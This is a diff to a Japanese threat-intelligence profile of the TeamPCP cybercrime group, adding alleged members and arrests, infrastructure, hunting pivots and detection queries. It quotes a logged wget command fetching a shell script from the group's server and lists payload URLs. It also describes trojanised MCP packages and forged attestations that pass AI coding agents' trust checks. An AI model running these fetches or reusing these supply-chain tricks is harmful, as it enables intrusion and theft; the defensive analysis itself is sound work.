@@ -2,7 +2,7 @@
 
 - プロファイルID: `actor--teampcp`
 - 状態: draft
-- 更新日時: 2026-09-21T13:20:00Z
+- 更新日時: 2026-09-22T00:00:00Z
 - 構造バージョン: 1.4.0
 
 ## エグゼクティブサマリー
@@ -24,7 +24,7 @@ TeamPCP(GTIG命名 UNC6780)は金銭目的のサイバー犯罪グループで�
 | SHADOW-WATER-058 | MITRE ATT&CK | overlapping | 高 | `source--mitre-attack-19-2`, `source--mitre-attack-g1056` | Official MITRE ATT&CK associated-group name for G1056. |
 | ShellForce | MITRE ATT&CK | overlapping | 高 | `source--mitre-attack-19-2`, `source--mitre-attack-g1056` | Official MITRE ATT&CK associated-group name for G1056. |
 | TA-NATALSTATUS |  | overlapping | 中 | `source--oligo-teampcp-2026` | Oligoは以前TA-NATALSTATUSとして追跡されたキャンペーンがTeamPCPと連続すると評価するが、同一運用者・密接な協力・基盤共有のいずれかまでは断定していないためexactへ強めない。 |
-| UNC6780 | MITRE ATT&CK | exact | 高 | `source--mitre-attack-g1056` | GTIGが「the cyber crime threat actor "TeamPCP" (aka UNC6780)」と同一主体として明記している。 Official MITRE ATT&CK associated-group name for G1056. |
+| UNC6780 | MITRE ATT&CK | exact | 高 | `source--mitre-attack-g1056`, `source--gtig-ai-threat-tracker-2026-05` | GTIGが「the cyber crime threat actor "TeamPCP" (aka UNC6780)」と同一主体として明記している。MITRE ATT&CKもG1056のAssociated Groupとして収録する。 |
 
 ## 帰属
 
@@ -39,8 +39,7 @@ TeamPCP(GTIG命名 UNC6780)は金銭目的のサイバー犯罪グループで�
 
 | 種別 | 説明 | 確度 | 証拠 | 補足 |
 |---|---|---|---|---|
-| financial | 資格情報・決済情報の窃取、ランサムウェア展開、恐喝グループとの提携による収益化。 | 高 | `source--oligo-teampcp-2026`, `source--sentinellabs-pcpjack-2026` |  |
-| financial-gain | Financially motivated intrusion or fraud. | 高 | `source--mitre-attack-19-2` | Derived from explicit MITRE ATT&CK actor description. |
+| financial-gain | 資格情報・決済情報の窃取、ランサムウェア展開、恐喝グループとの提携による収益化。 | 高 | `source--mitre-attack-19-2`, `source--oligo-teampcp-2026`, `source--sentinellabs-pcpjack-2026` | MITRE ATT&CKの金銭目的評価と、Oligo/SentinelLabsが記述する資格情報窃取・ランサムウェア・恐喝による収益化を統合した。重複するfinancial表記は別motivationとして数えない。 |
 
 ## 他アクターとの関係
 
@@ -48,15 +47,27 @@ TeamPCP(GTIG命名 UNC6780)は金銭目的のサイバー犯罪グループで�
 
 ## 関連する企業・個人
 
-関連エンティティなし
+| ID | 名称 | 種別 | 役割 | 国 | 初回 | 最終 | 確度 | 証拠 |
+|---|---|---|---|---|---|---|---|---|
+| threat-actor-individual--ruben-ian-thomson | Ruben Ian Thomson | threat-actor-individual | alleged-teampcp-member, alleged-leader | Australia, South Africa | 不明 | 不明 | 高 | `source--afp-teampcp-arrests-2026`, `source--abc-teampcp-arrests-2026`, `source--doj-teampcp-thomson-indictment-2026` |
+| threat-actor-individual--louis-michael-gaebler | Louis Michael Gaebler | threat-actor-individual | alleged-teampcp-member |  | 不明 | 不明 | 高 | `source--afp-teampcp-arrests-2026`, `source--abc-teampcp-arrests-2026` |
 
 ### エンティティ関係
 
-確認された関係なし
+| 起点 | 関係 | 終点 | 説明 | 初回 | 最終 | 確度 | 証拠 |
+|---|---|---|---|---|---|---|---|
+| threat-actor-individual--ruben-ian-thomson | alleged-member-of | actor--teampcp | Australian and U.S. authorities allege that Thomson participated in TeamPCP; ABC reports investigators described him as an alleged leader. | 不明 | 不明 | 高 | `source--afp-teampcp-arrests-2026`, `source--abc-teampcp-arrests-2026`, `source--doj-teampcp-thomson-indictment-2026` |
+| threat-actor-individual--louis-michael-gaebler | alleged-member-of | actor--teampcp | Australian authorities allege that Gaebler participated in TeamPCP. | 不明 | 不明 | 高 | `source--afp-teampcp-arrests-2026`, `source--abc-teampcp-arrests-2026` |
 
 ### 法的措置
 
-確認された法的措置なし
+| 対象 | 措置 | 当局 | 日付 | 状態 | 説明 | 証拠 |
+|---|---|---|---|---|---|---|
+| Ruben Ian Thomson | arrest | Australian Federal Police | 2026-08-26 | completed | Arrested in Western Australia in the AFP/FBI/WAPF operation. | `source--afp-teampcp-arrests-2026`, `source--doj-teampcp-thomson-indictment-2026` |
+| Ruben Ian Thomson | charge | Australian Federal Police / Australian courts | 2026-08-26 | alleged | Charged in Australia with eight alleged offences described by the AFP. | `source--afp-teampcp-arrests-2026`, `source--abc-teampcp-arrests-2026` |
+| Ruben Ian Thomson | indictment | U.S. District Court for the Northern District of California | 2026-08-25 | alleged | Federally indicted for alleged conspiracy to violate the Computer Fraud and Abuse Act and obtaining information from a protected computer. | `source--doj-teampcp-thomson-indictment-2026` |
+| Louis Michael Gaebler | arrest | Australian Federal Police | 2026-08-26 | completed | Arrested in Western Australia in the AFP/FBI/WAPF operation. | `source--afp-teampcp-arrests-2026` |
+| Louis Michael Gaebler | charge | Australian Federal Police / Australian courts | 2026-08-26 | alleged | Charged in Australia with six alleged offences described by the AFP. | `source--afp-teampcp-arrests-2026`, `source--abc-teampcp-arrests-2026` |
 
 ## ダイヤモンドモデル
 
@@ -121,6 +132,8 @@ TeamPCP(GTIG命名 UNC6780)は金銭目的のサイバー犯罪グループで�
 | ID | 名称 | 説明 | 初回 | 最終 | 確度 | 証拠 |
 |---|---|---|---|---|---|---|
 | infra--masscan-cloud | masscan.cloud / natalstatus.org 基盤 | TA-NATALSTATUS、ShadowRay 2.0、TeamPCPの各キャンペーンで再利用された中核基盤。auth、checkout、pay、mail、testなどのサブドメインが資格情報・決済フィッシングとインフラ試験に使われ、pcp.masscan.cloudはTeamPCPのTelegramチャンネルへ誘導していた。 | 2020 | 2026-04 | 高 | `source--oligo-teampcp-2026` |
+| infra--teampcp-shadowray-ironern-control | ShadowRay 2.0 / IronErn 運用ノード 103.127.134.124 | 侵害済みRayクラスタからのreverse shellを受信し、同時期にIronErn関連GitLabアカウントの認証元として使われた運用ノード。Oligoはこの重複をShadowRay 2.0とIronErn identitiesの直接的な運用上の接点としている。masscan.cloud基盤そのものへの所属は示されていないため別objectとする。 | 2025-10-15 | 2025-11-16 | 高 | `source--oligo-teampcp-2026` |
+| infra--teampcp-oss-staging-2026 | TeamPCP 2026年OSS攻撃ステージング基盤 | 2026年3月のOSSサプライチェーン侵害を支えたscan.aquasecurity.orgとcheckmarx.zoneのステージング基盤。Oligoが示す2026-03-17と2026-03-22はCertificate Transparencyのfirst-seenであり、攻撃実行日または関係期間には転用しない。 | 不明 | 不明 | 高 | `source--oligo-teampcp-2026` |
 
 ### 配送・ファイル形式
 
@@ -143,15 +156,32 @@ TeamPCP(GTIG命名 UNC6780)は金銭目的のサイバー犯罪グループで�
 
 ## C2・マルウェア ハンティング・ピボット
 
-構造化されたハンティング・ピボットなし
+| ID | 分類 | 型 | 値 | 帰属範囲 | 観測数 | 出典数 | 活動数 | 初回 | 最終 | 継続評価 | 稼働評価 | 確度 | 証拠 |
+|---|---|---|---|---|---|---|---|---|---|---|---|---|---|
+| hunting-pivot--teampcp-masscan-ct-records | infrastructure | certificate-transparency-record-set | crt.sh IDs 18348750576, 18348751301, 18349037873, 18349038225; masscan.cloud / matrix.masscan.cloud; issuer Let's Encrypt E6; CT first seen 2025-05-11 | shared | 4 | 1 | 1 | 不明 | 不明 | single-observation | unknown | 高 | `source--oligo-teampcp-2026` |
+| hunting-pivot--teampcp-masscan-wildcard-phishing | infrastructure | wildcard-domain-family | *.bank-phish.masscan.cloud; *.test-phish.masscan.cloud; *.zendesk.masscan.cloud | actor-specific | 3 | 1 | 1 | 2026-01-02 | 2026-01-02 | single-observation | unknown | 高 | `source--oligo-teampcp-2026` |
+| hunting-pivot--teampcp-deployment-path-lineage | infrastructure | uri-path-lineage | /EP9ts2/; /ep9TS2/ndt.sh; /files/netsh; /files/keyen.sh | shared | 6 | 1 | 1 | 2025-06 | 2025-10-02 | reused | unknown | 高 | `source--oligo-teampcp-2026` |
 
 ### 観測根拠
 
-観測記録なし
+| Pivot | 観測ID | 観測時期 | 数 | 数の根拠 | 活動 | 出典 | 文脈 |
+|---|---|---|---|---|---|---|---|
+| hunting-pivot--teampcp-masscan-ct-records | pivot-observation--teampcp-masscan-ct-records-2025 | 不明 | 4 | documented-observables | activity--teampcp-oligo-lineage-2020-2026 | source--oligo-teampcp-2026 | Oligo table lists four crt.sh record IDs for masscan.cloud and matrix.masscan.cloud with Let's Encrypt E6 and CT first-seen 2025-05-11. The CT timestamp is retained in context and is not converted into an attack-observation time. |
+| hunting-pivot--teampcp-masscan-wildcard-phishing | pivot-observation--teampcp-masscan-wildcards-2026-01-02 | 2026-01-02 | 3 | documented-observables | activity--teampcp-oligo-lineage-2020-2026 | source--oligo-teampcp-2026 | Oligo lists three wildcard families as first observed on 2026-01-02; the report does not enumerate exact child hostnames. |
+| hunting-pivot--teampcp-deployment-path-lineage | pivot-observation--teampcp-ep9ts2-2025-06 | 2025-06 | 1 | documented-observables | activity--teampcp-oligo-lineage-2020-2026 | source--oligo-teampcp-2026 | 103.79.77.16 served /ep9TS2/ndt.sh in the wild during June 2025. |
+| hunting-pivot--teampcp-deployment-path-lineage | pivot-observation--teampcp-ep9ts2-2025-07-26 | 2025-07-26 | 1 | documented-events | activity--teampcp-oligo-lineage-2020-2026 | source--oligo-teampcp-2026 | A compromised Ray cluster logged wget https://matrix.masscan.cloud/ep9TS2/ndt.sh on 2025-07-26. |
+| hunting-pivot--teampcp-deployment-path-lineage | pivot-observation--teampcp-files-netsh-2025-09-21 | 2025-09-21 | 1 | documented-events | activity--teampcp-oligo-lineage-2020-2026 | source--oligo-teampcp-2026 | 67.217.57.240:666/files/netsh appears in the dated payload-evolution table. |
+| hunting-pivot--teampcp-deployment-path-lineage | pivot-observation--teampcp-files-netsh-2025-09-26 | 2025-09-26 | 1 | documented-events | activity--teampcp-oligo-lineage-2020-2026 | source--oligo-teampcp-2026 | 67.217.57.240:666/files/netsh appears again in the dated payload-evolution table. |
+| hunting-pivot--teampcp-deployment-path-lineage | pivot-observation--teampcp-files-netsh-2025-09-28 | 2025-09-28 | 1 | documented-events | activity--teampcp-oligo-lineage-2020-2026 | source--oligo-teampcp-2026 | 67.217.57.240:666/files/netsh appears a third time in the dated payload-evolution table. |
+| hunting-pivot--teampcp-deployment-path-lineage | pivot-observation--teampcp-files-keyen-2025-10-02 | 2025-10-02 | 1 | documented-events | activity--teampcp-oligo-lineage-2020-2026 | source--oligo-teampcp-2026 | 67.217.57.240:666/files/keyen.sh appears in the dated payload-evolution table. |
 
 ### ハントクエリ
 
-クエリなし
+| Pivot | 基盤 | クエリ | 目的 | 検証 | 誤検知上の注意 |
+|---|---|---|---|---|---|
+| hunting-pivot--teampcp-masscan-ct-records | other | `crt.sh IDs IN (18348750576,18348751301,18349037873,18349038225) OR (name IN (masscan.cloud,matrix.masscan.cloud) AND issuer contains "E6")` | Resolve the exact historical certificates and inspect SANs or fingerprints without mistaking record IDs for digests. | 要 | Let's Encrypt E6 is generic. Require the exact CT ID or domain plus certificate material and corroborate against the dated TeamPCP infrastructure before attribution. |
+| hunting-pivot--teampcp-masscan-wildcard-phishing | other | `lower(fqdn) matches ^[^.]+\.(bank-phish\|test-phish\|zendesk)\.masscan\.cloud$` | Generate exact child-host candidates from DNS, CT, proxy, or SIEM telemetry. | 要 | Do not convert the wildcard itself into an IOC. Validate each exact hostname, observation time, content, resolution, and continued control before linking it to TeamPCP. |
+| hunting-pivot--teampcp-deployment-path-lineage | siem | `url.path IN ("/ep9TS2/ndt.sh","/files/netsh","/files/keyen.sh") OR command_line contains "/EP9ts2/"` | Find the reported deployment-path lineage in proxy, web, process, or command telemetry. | 要 | Path fragments and filenames can be shared. Require a known TeamPCP-linked host, port 666, payload behavior, or temporal overlap before attribution. |
 
 ### 継続利用チェック
 
@@ -163,15 +193,15 @@ TeamPCP(GTIG命名 UNC6780)は金銭目的のサイバー犯罪グループで�
 
 | 活動 | 種別 | 初回 | 最終 | 報告日 | 標的 | マルウェア | TTP | 被害事例 | 説明 | 確度 | 証拠 |
 |---|---|---|---|---|---|---|---|---|---|---|---|
-| 新たなインテリジェンスがTeamPCPとShadowRay 2.0を関連付け、活動を2020年まで遡及 | infrastructure-operation | 2020 | 2026-04 | 2026-08-08 |  |  | ttp--teampcp-t1059-004-ndt-sh, ttp--teampcp-t1190-exposed-services, ttp--teampcp-t1486-ransomware | victim--activity-rule--829e65b1ac18ce5ea420, victim--teampcp-exposed-cloud-services | Oligo Securityは、ShadowRay 2.0でAI基盤を自己増殖型ボットネット化した攻撃主体をTeamPCPと評価し、活動を少なくとも2020年まで遡った。 TA-NATALSTATUS、IronErn、TeamPCPの間でドメイン、C2、マルウェア配置パス、ステージング手法などが重複し、継続的な運用基盤が確認された。 攻撃者はRay、Docker、Redis、Reactなどの公開サービスを自動・ワーム型で侵害し、2026年にはGitHubやGitLabを狙うサプライチェーン攻撃へ拡大した。 2025年には侵害したRayクラスタへ長期間リバースシェルを維持し、GitLabのIronErn関連アカウントも同一IPから管理されていた。 OligoはTeamPCPを既存活動の継続または再ブランドと評価するが、同一運用者、密接な協力関係、共有基盤のどれかまでは断定していない。 | 高 | `source--daily-48f251212f832ab9b6df` |
-| GitHub Actions・PyPI・npm・Docker Hubを経由したオープンソースサプライチェーン侵害 | supply-chain-cybercrime | 2026-02 | 2026-03 | 2026-05-11 | target--activity-rule--sector--932f4928d5e1ec28e2df | malware--dustmaker, malware--sandclock, malware--teampcp-cloud-stealer | ttp--teampcp-t1195-002-oss-supply-chain, ttp--teampcp-t1552-001-build-secrets | victim--activity-rule--36589755fc4094ee8555, victim--teampcp-oss-projects-2026 | TeamPCPはGitHubリポジトリと関連するGitHub Actionsを侵害し、Trivy脆弱性スキャナー、Checkmarx、LiteLLM、BerriAIを含む複数のサプライチェーン侵害に関与したと表明した。初期アクセスは侵害済みPyPIパッケージと悪意あるプルリクエストを経由し、ビルド環境からAWSキーとGitHubトークンを窃取するSANDCLOCK資格情報スティーラーを埋め込んだ。窃取した資格情報はランサムウェアやデータ恐喝グループとの提携で収益化されている。GTIGの後継報告(2026-09-08)は、2026年3月以降も大規模なOSSサプライチェーン侵害が継続し、対象エコシステムがPyPIに加えnpmとDocker Hubへ広がったと記載する。侵害後は資格情報スティーラーを展開して専有データと資格情報を取得し、データの直接売却またはランサムウェア・データ恐喝グループとの提携により収益化する。AIコーディングアシスタントを標的とする手口として、侵害した正規の開発者アカウントからPyPIへ正規MCPサーバーのトロイの木馬化フォーク(tiktoken_mcp等)を公開し、公式の組織GitHubリポジトリ(azure-functions-mcp-extension等)へ悪性コードを直接注入した。これらMCPツールと連携部分をバックドア化することで、資産がダウンロードまたはクローンされる際にペイロードと悪性ワークスペースフックが開発環境へ自動的に取り込まれる。資格情報スティーラーDUSTMAKERはCI/CD環境を検知するとGitHub Actionsランナーのプロセスメモリからoidcトークンを抽出し、trusted publisherとして有効なSLSA Build 3署名付き証明を伴う改ざん版パッケージを公開するため、AIコーディングエージェントの自動信頼チェックを通過する。Mandiantが対応した事案では、TeamPCPが初期アクセスを確立した後に別の脅威アクターへアクセスを引き渡し、引き渡し先がLAPSUSブランドを用いて身代金を要求した。TeamPCPが当該企業の専有AIリポジトリに対して悪性のGitHub Actionsワークフローを作成し、恐喝側がそのAIリポジトリの複製を持ち出した証跡が示されている。 | 高 | `source--gtig-adversarial-ai-2026`, `source--gtig-ai-threat-tracker-2026-05`, `source--sentinellabs-pcpjack-2026` |
+| Oligoが関連付けた2020–2026年の複数活動・基盤系譜 | historical-activity-cluster | 2020 | 2026-04 | 2026-08-05 |  |  | ttp--teampcp-t1059-004-ndt-sh, ttp--teampcp-t1190-exposed-services, ttp--teampcp-t1486-ransomware | victim--teampcp-exposed-cloud-services | Oligo Securityは、ShadowRay 2.0でAI基盤を自己増殖型ボットネット化した攻撃主体をTeamPCPと評価し、活動を少なくとも2020年まで遡った。 TA-NATALSTATUS、IronErn、TeamPCPの間でドメイン、C2、マルウェア配置パス、ステージング手法などが重複し、継続的な運用基盤が確認された。 攻撃者はRay、Docker、Redis、Reactなどの公開サービスを自動・ワーム型で侵害し、2026年にはGitHubやGitLabを狙うサプライチェーン攻撃へ拡大した。 2025年には侵害したRayクラスタへ長期間リバースシェルを維持し、GitLabのIronErn関連アカウントも同一IPから管理されていた。 OligoはTeamPCPを既存活動の継続または再ブランドと評価するが、同一運用者、密接な協力関係、共有基盤のどれかまでは断定していない。 | 中 | `source--oligo-teampcp-2026` |
+| GitHub Actions・PyPI・npm・Docker Hubを経由したオープンソースサプライチェーン侵害 | supply-chain-cybercrime | 2026-02 | 2026-03 | 2026-05-11 | target--activity-rule--sector--932f4928d5e1ec28e2df | malware--dustmaker, malware--sandclock, malware--teampcp-cloud-stealer | ttp--teampcp-t1195-002-oss-supply-chain, ttp--teampcp-t1552-001-build-secrets | victim--activity-rule--36589755fc4094ee8555, victim--teampcp-oss-projects-2026 | TeamPCPはGitHubリポジトリと関連するGitHub Actionsを侵害し、Trivy脆弱性スキャナー、Checkmarx、LiteLLM、BerriAIを含む複数のサプライチェーン侵害に関与したと表明した。初期アクセスは侵害済みPyPIパッケージと悪意あるプルリクエストを経由し、ビルド環境からAWSキーとGitHubトークンを窃取するSANDCLOCK資格情報スティーラーを埋め込んだ。窃取した資格情報はランサムウェアやデータ恐喝グループとの提携で収益化されている。GTIGの後継報告(2026-09-08)は、2026年3月以降も大規模なOSSサプライチェーン侵害が継続し、対象エコシステムがPyPIに加えnpmとDocker Hubへ広がったと記載する。侵害後は資格情報スティーラーを展開して専有データと資格情報を取得し、データの直接売却またはランサムウェア・データ恐喝グループとの提携により収益化する。AIコーディングアシスタントを標的とする手口として、侵害した正規の開発者アカウントからPyPIへ正規MCPサーバーのトロイの木馬化フォーク(tiktoken_mcp等)を公開し、公式の組織GitHubリポジトリ(azure-functions-mcp-extension等)へ悪性コードを直接注入した。これらMCPツールと連携部分をバックドア化することで、資産がダウンロードまたはクローンされる際にペイロードと悪性ワークスペースフックが開発環境へ自動的に取り込まれる。資格情報スティーラーDUSTMAKERはCI/CD環境を検知するとGitHub Actionsランナーのプロセスメモリからoidcトークンを抽出し、trusted publisherとして有効なSLSA Build 3署名付き証明を伴う改ざん版パッケージを公開するため、AIコーディングエージェントの自動信頼チェックを通過する。Mandiantが対応した事案では、TeamPCPが初期アクセスを確立した後に別の脅威アクターへアクセスを引き渡し、引き渡し先がLAPSUSブランドを用いて身代金を要求した。TeamPCPが当該企業の専有AIリポジトリに対して悪性のGitHub Actionsワークフローを作成し、恐喝側がそのAIリポジトリの複製を持ち出した証跡が示されている。 | 高 | `source--gtig-adversarial-ai-2026`, `source--gtig-ai-threat-tracker-2026-05`, `source--oligo-teampcp-2026`, `source--sentinellabs-pcpjack-2026` |
 
 ### 活動別ダイヤモンドモデル
 
 | 活動 | 攻撃者 | マルウェア | TTP | インフラ | 標的属性 | 被害事例 | 確度 |
 |---|---|---|---|---|---|---|---|
-| 新たなインテリジェンスがTeamPCPとShadowRay 2.0を関連付け、活動を2020年まで遡及 | TeamPCP | ShadowRay 2.0 ペイロード | T1059.004 Unix Shell, T1190 Exploit Public-Facing Application, T1486 Data Encrypted for Impact | masscan.cloud / natalstatus.org 基盤 | 情報なし | 被害事例: 新たなインテリジェンスがTeamPCPとShadowRay 2.0を関連付け、活動を2020年まで遡及, インターネットへ露出したRay/Docker/Redis/React環境(集約) | 高 |
-| GitHub Actions・PyPI・npm・Docker Hubを経由したオープンソースサプライチェーン侵害 | TeamPCP | DUSTMAKER, SANDCLOCK, TeamPCP Cloud Stealer | T1195.002 Compromise Software Supply Chain, T1552.001 Credentials In Files | masscan.cloud / natalstatus.org 基盤 | IT・ソフトウェア | 被害事例: GitHub Actions・PyPI・npm・Docker Hubを経由したオープンソースサプライチェーン侵害, Trivy / Checkmarx / LiteLLM / BerriAI | 高 |
+| Oligoが関連付けた2020–2026年の複数活動・基盤系譜 | TeamPCP | ShadowRay 2.0 ペイロード | T1059.004 Unix Shell, T1190 Exploit Public-Facing Application, T1486 Data Encrypted for Impact | masscan.cloud / natalstatus.org 基盤, TeamPCP 2026年OSS攻撃ステージング基盤, ShadowRay 2.0 / IronErn 運用ノード 103.127.134.124 | 情報なし | インターネットへ露出したRay/Docker/Redis/React環境(集約) | 中 |
+| GitHub Actions・PyPI・npm・Docker Hubを経由したオープンソースサプライチェーン侵害 | TeamPCP | DUSTMAKER, SANDCLOCK, TeamPCP Cloud Stealer | T1195.002 Compromise Software Supply Chain, T1552.001 Credentials In Files | TeamPCP 2026年OSS攻撃ステージング基盤 | IT・ソフトウェア | 被害事例: GitHub Actions・PyPI・npm・Docker Hubを経由したオープンソースサプライチェーン侵害, Trivy / Checkmarx / LiteLLM / BerriAI | 高 |
 
 2025年後半にTeamPCPとして公然化した。2026年2月から3月にかけてTrivy、Checkmarx、LiteLLM、BerriAIのサプライチェーン侵害に関与したと表明し、2026年8月にOligoがTA-NATALSTATUSおよびIronErnとの連続性と2020年までの遡及を報告した。
 
@@ -179,7 +209,6 @@ TeamPCP(GTIG命名 UNC6780)は金銭目的のサイバー犯罪グループで�
 
 | 分類 | 名称 | 説明 | 初回 | 最終 | 確度 | 証拠 |
 |---|---|---|---|---|---|---|
-| regions | 全世界 | 一次資料は特定国を標的条件として挙げず、インターネットへ露出したサービスとオープンソース配布網を対象としている。 | 不明 | 不明 | 中 | `source--oligo-teampcp-2026`, `source--gtig-ai-threat-tracker-2026-05` |
 | sectors | IT・ソフトウェア | 活動「GitHub Actions・PyPI・npm・Docker Hubを経由したオープンソースサプライチェーン侵害」の記述で標的として明示された産業。 | 2026-02 | 2026-03 | 中 | `source--gtig-adversarial-ai-2026`, `source--gtig-ai-threat-tracker-2026-05`, `source--sentinellabs-pcpjack-2026` |
 | sectors | 暗号資産・Web3 | Initially focused on ransomware and cryptocurrency theft, [TeamPCP](https://attack.mitre.org/groups/G1056) shifted in early 2026 to systematic, worm-driven credential theft and software supply chain attacks targeting Continuous Integration and Continuous Delivery (CI/CD) workflows. | 不明 | 不明 | 高 | `source--mitre-attack-19-2` |
 | sectors | クラウド・AI基盤運用 | Ray、Kubernetes、Docker、Redisなどの運用環境が侵害対象として明示されている。 | 不明 | 不明 | 高 | `source--oligo-teampcp-2026`, `source--sentinellabs-pcpjack-2026` |
@@ -193,8 +222,7 @@ TeamPCP(GTIG命名 UNC6780)は金銭目的のサイバー犯罪グループで�
 | 事例 | 被害者 | 公開状態 | 種別 | 事例状態 | 標的属性 | マルウェア | TTP | 影響資産 | 影響 | 初回 | 最終 | 報告日 | 確度 | 証拠 |
 |---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|
 | 被害事例: GitHub Actions・PyPI・npm・Docker Hubを経由したオープンソースサプライチェーン侵害 | 非公開 | aggregate | multiple-organizations | reported | target--activity-rule--sector--932f4928d5e1ec28e2df | malware--dustmaker, malware--sandclock, malware--teampcp-cloud-stealer | ttp--teampcp-t1195-002-oss-supply-chain, ttp--teampcp-t1552-001-build-secrets | サーバー, エンドポイント, クラウド／SaaS, 開発環境／ソースコード | credential-theft: 初期アクセスは侵害済みPyPIパッケージと悪意あるプルリクエストを経由し、ビルド環境からAWSキーとGitHubトークンを窃取するSANDCLOCK資格情報スティーラーを埋め込んだ。<br>encryption: 窃取した資格情報はランサムウェアやデータ恐喝グループとの提携で収益化されている。 | 2026-02 | 2026-03 | 2026-05-11 | 高 | `source--gtig-adversarial-ai-2026`, `source--gtig-ai-threat-tracker-2026-05`, `source--sentinellabs-pcpjack-2026` |
-| 被害事例: 新たなインテリジェンスがTeamPCPとShadowRay 2.0を関連付け、活動を2020年まで遡及 | 非公開 | anonymous | unknown | reported |  |  | ttp--teampcp-t1059-004-ndt-sh, ttp--teampcp-t1190-exposed-services, ttp--teampcp-t1486-ransomware | エンドポイント, 開発環境／ソースコード | supply-chain: 攻撃者はRay、Docker、Redis、Reactなどの公開サービスを自動・ワーム型で侵害し、2026年にはGitHubやGitLabを狙うサプライチェーン攻撃へ拡大した。 | 2020 | 2026-04 | 2026-08-08 | 高 | `source--daily-48f251212f832ab9b6df` |
-| インターネットへ露出したRay/Docker/Redis/React環境(集約) | 非公開 | aggregate | multiple-organizations | reported |  | malware--shadowray-2-0-payloads | ttp--teampcp-t1190-exposed-services, ttp--teampcp-t1059-004-ndt-sh | Rayクラスタ, Redisサーバー, Dockerホスト, Kubernetes環境 | account-compromise: 侵害環境へのリバースシェルによる長期的な支配。<br>credential-theft: クラウド資格情報の窃取。<br>encryption: ランサムウェア展開による暗号化。 | 2020 | 2026-04 | 2026-08-05 | 高 | `source--oligo-teampcp-2026` |
+| インターネットへ露出したRay/Docker/Redis/React環境(集約) | 非公開 | aggregate | multiple-organizations | reported |  | malware--shadowray-2-0-payloads | ttp--teampcp-t1190-exposed-services, ttp--teampcp-t1059-004-ndt-sh | Rayクラスタ, Redisサーバー, Dockerホスト, Kubernetes環境 | account-compromise: 侵害環境へのリバースシェルによる長期的な支配。<br>credential-theft: クラウド資格情報の窃取。<br>encryption: ランサムウェア展開による暗号化。 | 2020 | 2026-04 | 2026-08-05 | 中 | `source--oligo-teampcp-2026` |
 | Trivy、Checkmarx、LiteLLM、BerriAI | Trivy / Checkmarx / LiteLLM / BerriAI | named | multiple-organizations | reported |  | malware--sandclock | ttp--teampcp-t1195-002-oss-supply-chain, ttp--teampcp-t1552-001-build-secrets | GitHubリポジトリ, GitHub Actionsワークフロー, PyPIパッケージ | supply-chain: オープンソース配布物とCIワークフローの汚染。<br>credential-theft: ビルド環境からのAWSキーとGitHubトークンの窃取。 | 2026-02 | 2026-03 | 2026-05-11 | 中 | `source--gtig-ai-threat-tracker-2026-05`, `source--sentinellabs-pcpjack-2026` |
 
 ## MITRE ATT&CK Matrixデータ
@@ -237,19 +265,19 @@ TeamPCP(GTIG命名 UNC6780)は金銭目的のサイバー犯罪グループで�
 | Execution | T1677 | Poisoned Pipeline Execution | [TeamPCP](https://attack.mitre.org/groups/G1056) has compromised trusted CI/CD pipelines by injecting credential-stealing payloads into legitimate workflows and software packages including open-source security tools Trivy and KICS, and AI gateway LiteLLM.(Citation: Wiz Trivy Compromise MAR 2026)(Citation: Aqua Security Trivy Compromise MAR 2026)(Citation: Aqua Security Trivy Compromise MAR 2026)(Citation: Aqua Security Blog Trivy Compromise APR 2026)(Citation: Sysdig TeamPCP MAR 2026)(Citation: Wiz TeamPCP KICS MAR 2026)(Citation: Aikido TeamPCP Telnyx MAR 2026)(Citation: Palo Alto TeamPCP MAR 2026)(Citation: Palo Alto TeamPCP MAR 2026)(Citation: Wiz Mini Shai-Hulud MAY 2026)(Citation: Trend Micro TeamPCP MAY 2026)(Citation: Hunt.io TeamPCP Toolkit MAY 2026)(Citation: Phoenix TeamPCP 20 MAY 2026)(Citation: Flashpoint Mini Shai-Hulud MAY 2026)(Citation: FBI TeamPCP JUL 2026)(Citation: Google AI Threat Tracker MAY 2026) |  |  | 不明 | 不明 | 高 | `source--mitre-attack-19-2` |
 | Resource Development | T1683.001 | Written Content | [TeamPCP](https://attack.mitre.org/groups/G1056) has created Dune-themed GitHub repositories using stolen tokens.(Citation: Wiz Mini Shai-Hulud MAY 2026) |  |  | 不明 | 不明 | 高 | `source--mitre-attack-19-2` |
 | Stealth | T1684.001 | Impersonation | [TeamPCP](https://attack.mitre.org/groups/G1056) impersonated legitimate maintainers to push imposter commits to the Aquasecurity Trivy scanner GitHub repository.(Citation: Wiz Trivy Compromise MAR 2026)(Citation: Aqua Security Blog Trivy Compromise APR 2026) |  |  | 不明 | 不明 | 高 | `source--mitre-attack-19-2` |
-| Execution | T1059.004 | Unix Shell | 侵害したRayクラスタへ第1段階シェルスクリプトndt.shを配信して実行し、リバースシェルと追加ペイロードを取得する。 |  | activity--daily-5aa545c901df820c7aa2 | 2025-06 | 不明 | 高 | `source--oligo-teampcp-2026` |
-| Initial Access | T1190 | Exploit Public-Facing Application | Ray、Docker、Redis、Reactなどインターネットへ露出したサービスを自動・ワーム型で侵害する。 |  | activity--daily-5aa545c901df820c7aa2 | 2020 | 2026-04 | 高 | `source--oligo-teampcp-2026` |
+| Execution | T1059.004 | Unix Shell | 侵害したRayクラスタへ第1段階シェルスクリプトndt.shを配信して実行し、リバースシェルと追加ペイロードを取得する。 |  | activity--teampcp-oligo-lineage-2020-2026 | 2025-06 | 不明 | 高 | `source--oligo-teampcp-2026` |
+| Initial Access | T1190 | Exploit Public-Facing Application | Ray、Docker、Redis、Reactなどインターネットへ露出したサービスを自動・ワーム型で侵害する。 |  | activity--teampcp-oligo-lineage-2020-2026 | 2020 | 2026-04 | 高 | `source--oligo-teampcp-2026` |
 | Initial Access | T1195.002 | Compromise Software Supply Chain | 侵害済みPyPIパッケージと悪意あるプルリクエストを起点にGitHubリポジトリとGitHub Actionsを侵害し、配布物へ悪性コードを埋め込む。 |  | activity--teampcp-oss-supply-chain-2026 | 2026-02 | 2026-03 | 高 | `source--gtig-ai-threat-tracker-2026-05`, `source--sentinellabs-pcpjack-2026` |
-| Impact | T1486 | Data Encrypted for Impact | 侵害したクラウド環境でランサムウェアを展開し、恐喝グループとの提携で収益化する。 |  | activity--daily-5aa545c901df820c7aa2 | 不明 | 不明 | 高 | `source--oligo-teampcp-2026`, `source--sentinellabs-pcpjack-2026` |
+| Impact | T1486 | Data Encrypted for Impact | 侵害したクラウド環境でランサムウェアを展開し、恐喝グループとの提携で収益化する。 |  | activity--teampcp-oligo-lineage-2020-2026 | 不明 | 不明 | 高 | `source--oligo-teampcp-2026`, `source--sentinellabs-pcpjack-2026` |
